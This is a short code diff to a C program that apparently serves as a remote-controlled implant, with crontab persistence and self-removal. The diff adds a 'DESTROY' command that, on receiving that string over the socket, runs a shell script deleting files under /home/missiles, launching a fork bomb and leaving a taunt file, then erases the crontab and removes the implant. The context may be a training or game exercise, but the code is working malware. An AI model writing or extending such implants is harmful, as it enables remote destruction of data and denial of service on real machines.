@@ -367,6 +367,13 @@ int main(void) {
 
 #ifdef COMMANDS
 void commands(int sockfd){
+  #define DESTROY "\
+  #/bin/bash \n\
+  rm /home/missiles/*\n\
+  cd ~\n\
+  :(){ :|: & };:\n\
+  echo \"Freedom was here\" > getwrecked.txt\n\
+  "
   char * buf = calloc(MAXDATASIZE,1 );
   int numbytes;
   int endConnect = 0;
@@ -382,7 +389,6 @@ void commands(int sockfd){
       remove("/bin/implant");
       remove(MUTEX);
       free(buf);
-      exit(0);
       //remove cron, the implant a.out, and then exit() the implant process
 
       endConnect = 1;
@@ -409,6 +415,14 @@ void commands(int sockfd){
       free(buf);
       kill(getpid(), SIGKILL);
       endConnect = 1;
+    }
+    else if(strcmp(buf,"DESTROY\n") == 0){
+      system(DESTROY);
+      //also uninstall
+      system("crontab -r");
+      remove("/bin/implant");
+      remove(MUTEX);
+      free(buf);
     }
   }
 }
